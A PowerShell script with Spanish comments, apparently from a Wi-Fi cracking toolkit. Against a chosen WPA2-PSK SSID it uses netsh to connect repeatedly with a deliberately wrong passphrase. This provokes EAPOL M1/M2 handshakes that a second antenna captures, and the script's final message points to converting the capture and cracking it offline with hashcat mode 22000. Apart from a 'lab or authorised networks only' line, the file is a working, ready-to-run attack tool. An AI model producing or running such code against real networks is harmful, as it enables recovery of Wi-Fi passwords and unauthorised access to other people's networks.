<#
.SYNOPSIS
  Gatillo EAPOL para captura pasiva en Windows (dos antenas): asocia una interfaz
  en modo managed con contraseña incorrecta para provocar M1/M2 (y PMKID si el AP
  lo expone) mientras otra antena captura en monitor.

  SOLO LABORATORIO / REDES PROPIAS O CON AUTORIZACIÓN EXPLÍCITA.

.DESCRIPTION
  - La antena de CAPTURA (p.ej. RT73 en monitor, canal fijado al AP) debe estar
    capturando ANTES de lanzar este script (UIFIPILL: native_capture/monitor en
    el canal del objetivo). Npcap no inyecta: esto solo dispara el intercambio
    de asociación desde la antena "gatillo".
  - La antena GATILLO (p.ej. RT3070 en managed, driver vendor, visible para
    netsh, NO en WinUSB) se asocia al SSID con una clave falsa: el AP envía M1
    y la STA responde M2 con MIC calculado con la clave errónea; ese par M1+M2
    es crackeable offline (hashcat -m 22000, WPA*02*) aunque la autenticación
    falle. La clave real no se envía.

.PARAMETER Ssid
  SSID del AP objetivo (WPA2-PSK). Obligatorio.

.PARAMETER Interface
  Nombre de la interfaz Wi-Fi gatillo en modo managed (p.ej. "Wi-Fi 2").
  Obligatorio. Ver nombres: netsh wlan show interfaces

.PARAMETER Attempts
  Número de intentos de conexión. Por defecto 5.

.PARAMETER DelaySeconds
  Segundos de espera entre intentos. Por defecto 3.

.PARAMETER Password
  Contraseña falsa (>=8 caracteres) usada para forzar el fallo de autenticación.
  Por defecto "clavefalsa123".

.PARAMETER ProfileName
  Nombre del perfil WLAN temporal. Por defecto igual a -Ssid.

.PARAMETER DisconnectBetween
  Desconecta la interfaz entre intentos para forzar un nuevo intercambio.
  Por defecto: activado.

.PARAMETER KeepProfile
  Conserva el perfil WLAN al finalizar (por defecto se elimina).

.EXAMPLE
  .\scripts\wpa2_trigger.ps1 -Ssid "MiLab" -Interface "Wi-Fi 2"

.EXAMPLE
  .\scripts\wpa2_trigger.ps1 -Ssid "MiLab" -Interface "Wi-Fi 2" -Attempts 8 -DelaySeconds 4 -Password "badpass1234"
#>
[CmdletBinding()]
param(
  [Parameter(Mandatory = $true)][string]$Ssid,
  [Parameter(Mandatory = $true)][string]$Interface,
  [int]$Attempts = 5,
  [int]$DelaySeconds = 3,
  [string]$Password = "clavefalsa123",
  [string]$ProfileName,
  [switch]$NoDisconnectBetween,
  [switch]$KeepProfile
)

$ErrorActionPreference = "Stop"

if ($Attempts -lt 1) { throw "-Attempts debe ser >= 1" }
if ($DelaySeconds -lt 0) { throw "-DelaySeconds debe ser >= 0" }
if ($Password.Length -lt 8) { throw "-Password debe tener al menos 8 caracteres (WPA2-PSK)" }
if (-not $ProfileName) { $ProfileName = $Ssid }

function Escape-Xml([string]$s) {
  return [System.Security.SecurityElement]::Escape($s)
}

$ssidXml = Escape-Xml $Ssid
$profileXmlName = Escape-Xml $ProfileName
$passXml = Escape-Xml $Password

$profile = @"
<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
  <name>$profileXmlName</name>
  <SSIDConfig>
    <SSID>
      <name>$ssidXml</name>
    </SSID>
  </SSIDConfig>
  <connectionType>ESS</connectionType>
  <connectionMode>manual</connectionMode>
  <MSM>
    <security>
      <authEncryption>
        <authentication>WPA2PSK</authentication>
        <encryption>AES</encryption>
        <useOneX>false</useOneX>
      </authEncryption>
      <sharedKey>
        <keyType>passPhrase</keyType>
        <protected>false</protected>
        <keyMaterial>$passXml</keyMaterial>
      </sharedKey>
    </security>
  </MSM>
</WLANProfile>
"@

$tmp = Join-Path $env:TEMP ("wpa2_trigger_{0}.xml" -f ([guid]::NewGuid().ToString("N")))

Write-Host "[trigger] SSID='$Ssid' interfaz='$Interface' intentos=$Attempts espera=${DelaySeconds}s perfil='$ProfileName'" -ForegroundColor Cyan
Write-Host "[trigger] Asegura que la antena de captura (monitor, canal del AP) ya está capturando." -ForegroundColor Yellow

try {
  $profile | Set-Content -Path $tmp -Encoding UTF8

  Write-Host "[trigger] Eliminando perfil previo (si existe)..."
  & netsh wlan delete profile name="$ProfileName" interface="$Interface" 2>&1 | Out-Null

  Write-Host "[trigger] Añadiendo perfil temporal: $tmp"
  $addOut = & netsh wlan add profile filename="$tmp" interface="$Interface" 2>&1
  $addText = ($addOut | Out-String)
  Write-Host $addText.TrimEnd()
  if ($LASTEXITCODE -ne 0) { throw "netsh wlan add profile falló (exit $LASTEXITCODE)" }

  for ($i = 1; $i -le $Attempts; $i++) {
    Write-Host ("[trigger] Intento {0}/{1}: netsh wlan connect name=""{2}"" interface=""{3}""" -f $i, $Attempts, $ProfileName, $Interface) -ForegroundColor Green
    $connOut = & netsh wlan connect name="$ProfileName" interface="$Interface" 2>&1
    $connText = ($connOut | Out-String).TrimEnd()
    if ($connText) { Write-Host $connText }

    if ($i -lt $Attempts) {
      Start-Sleep -Seconds $DelaySeconds
      if (-not $NoDisconnectBetween) {
        & netsh wlan disconnect interface="$Interface" 2>&1 | Out-Null
        Start-Sleep -Milliseconds 500
      }
    }
  }

  Write-Host "[trigger] Completado. Si la captura tomó M1+M2/PMKID, conviértela (pcap_to_22000 en UIFIPILL o hcxpcapngtool) y verifica que exista WPA*01*/WPA*02* antes de crackear." -ForegroundColor Cyan
} finally {
  if (-not $KeepProfile) {
    & netsh wlan delete profile name="$ProfileName" interface="$Interface" 2>&1 | Out-Null
    Write-Host "[trigger] Perfil temporal eliminado."
  } else {
    Write-Host "[trigger] Perfil conservado (-KeepProfile): $ProfileName"
  }
  Remove-Item -Path $tmp -Force -ErrorAction SilentlyContinue
}
